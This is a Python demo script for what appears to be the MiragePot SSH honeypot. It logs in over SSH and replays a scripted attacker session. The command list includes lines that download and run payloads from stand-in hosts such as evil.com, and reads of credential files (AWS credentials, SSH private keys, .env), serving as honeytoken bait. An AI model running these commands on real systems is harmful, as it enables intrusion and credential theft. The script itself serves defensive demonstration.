#!/usr/bin/env python3
"""Demo session script for MiragePot presentations.

This script connects to the MiragePot SSH honeypot and executes a realistic
attacker command sequence with timing delays. Perfect for demos and presentations.

Usage:
    python scripts/demo_session.py
    python scripts/demo_session.py --host localhost --port 2222 --user root --password root
    python scripts/demo_session.py --delay 2.0
"""

from __future__ import annotations

import argparse
import sys
import time
from typing import List, Tuple

try:
    import paramiko
except ImportError:
    print("Error: paramiko is required. Install it with: pip install paramiko")
    sys.exit(1)


# Demo command sequence: (command, delay_after_seconds)
DEMO_COMMANDS: List[Tuple[str, float]] = [
    ("id", 2),
    ("whoami", 1),
    ("uname -a", 1.5),
    ("cat /etc/passwd", 2),
    ("ls /home", 1),
    ("cd /tmp && wget http://malicious.example.com/payload.sh", 3),
    ("curl -O http://evil.com/backdoor.sh || wget http://evil.com/backdoor.sh", 3),
    ("chmod +x payload.sh", 1),
    ("./payload.sh", 2),
    ("cat /root/.aws/credentials", 2.5),  # Honeytoken access
    ("cat /home/admin/.ssh/id_rsa", 2),  # Honeytoken access (might not exist)
    ("cat /var/www/html/.env", 2),  # Honeytoken access
]


def print_banner() -> None:
    """Print the demo banner."""
    print("=" * 70)
    print("  MiragePot Demo Session Script")
    print("  Simulating realistic attacker behavior")
    print("=" * 70)
    print()


def print_command(command: str, index: int, total: int) -> None:
    """Print the command being executed with formatting."""
    print(f"\n[{index}/{total}] Executing: \033[1;36m{command}\033[0m")


def print_response(response: str) -> None:
    """Print the command response."""
    if response.strip():
        print(f"\033[0;32m{response}\033[0m", end="")


def run_demo_session(
    host: str, port: int, username: str, password: str, delay_multiplier: float
) -> None:
    """Connect to honeypot and run demo command sequence.

    Args:
        host: SSH server hostname
        port: SSH server port
        username: SSH username
        password: SSH password
        delay_multiplier: Multiplier for delays between commands
    """
    print_banner()
    print(f"Connecting to {host}:{port} as {username}...")

    # Create SSH client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect to the honeypot
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=10,
            allow_agent=False,
            look_for_keys=False,
        )
        print("\033[1;32m✓ Connected successfully!\033[0m\n")
        time.sleep(1)

        # Get interactive shell
        channel = client.invoke_shell(term="xterm", width=80, height=24)
        time.sleep(0.5)

        # Read and discard the initial banner/prompt
        if channel.recv_ready():
            initial_output = channel.recv(4096).decode("utf-8", errors="ignore")
            print(initial_output)

        # Execute demo commands
        total_commands = len(DEMO_COMMANDS)
        for idx, (command, delay) in enumerate(DEMO_COMMANDS, start=1):
            print_command(command, idx, total_commands)

            # Send command
            channel.send(command + "\n")
            time.sleep(0.3)  # Wait for command to be processed

            # Read response with timeout
            response_parts = []
            timeout = 5.0
            start_time = time.time()

            while time.time() - start_time < timeout:
                if channel.recv_ready():
                    chunk = channel.recv(4096).decode("utf-8", errors="ignore")
                    response_parts.append(chunk)
                    # Continue reading if more data is coming
                    time.sleep(0.1)
                else:
                    # No more data available
                    if response_parts:
                        break
                    time.sleep(0.1)

            response = "".join(response_parts)
            print_response(response)

            # Apply delay before next command
            adjusted_delay = delay * delay_multiplier
            if idx < total_commands:  # Don't delay after last command
                print(f"\n\033[0;33m⏱  Waiting {adjusted_delay:.1f}s...\033[0m")
                time.sleep(adjusted_delay)

        print("\n" + "=" * 70)
        print("  Demo session complete!")
        print("=" * 70)

    except paramiko.AuthenticationException:
        print("\033[1;31m✗ Authentication failed!\033[0m")
        print("The honeypot should accept any password. Check if it's running.")
        sys.exit(1)
    except paramiko.SSHException as e:
        print(f"\033[1;31m✗ SSH error: {e}\033[0m")
        sys.exit(1)
    except ConnectionRefusedError:
        print(f"\033[1;31m✗ Connection refused to {host}:{port}\033[0m")
        print("Is the honeypot running? Try: docker compose up -d")
        sys.exit(1)
    except Exception as e:
        print(f"\033[1;31m✗ Unexpected error: {e}\033[0m")
        sys.exit(1)
    finally:
        client.close()


def main() -> None:
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Run a demo attacker session against MiragePot honeypot",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Connect to local honeypot with defaults
  python scripts/demo_session.py

  # Connect to remote honeypot
  python scripts/demo_session.py --host 192.168.1.100 --port 2222

  # Adjust timing (2x slower for presentations)
  python scripts/demo_session.py --delay 2.0

  # Quick demo (0.5x speed)
  python scripts/demo_session.py --delay 0.5
        """,
    )

    parser.add_argument(
        "--host",
        default="localhost",
        help="SSH server hostname (default: localhost)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=2222,
        help="SSH server port (default: 2222)",
    )
    parser.add_argument(
        "--user",
        default="root",
        help="SSH username (default: root)",
    )
    parser.add_argument(
        "--password",
        default="password",
        help="SSH password (default: password)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=1.5,
        help="Delay multiplier between commands (default: 1.5)",
    )

    args = parser.parse_args()

    # Validate arguments
    if args.port < 1 or args.port > 65535:
        print("Error: Port must be between 1 and 65535")
        sys.exit(1)

    if args.delay < 0:
        print("Error: Delay must be positive")
        sys.exit(1)

    # Run the demo
    run_demo_session(args.host, args.port, args.user, args.password, args.delay)


if __name__ == "__main__":
    main()
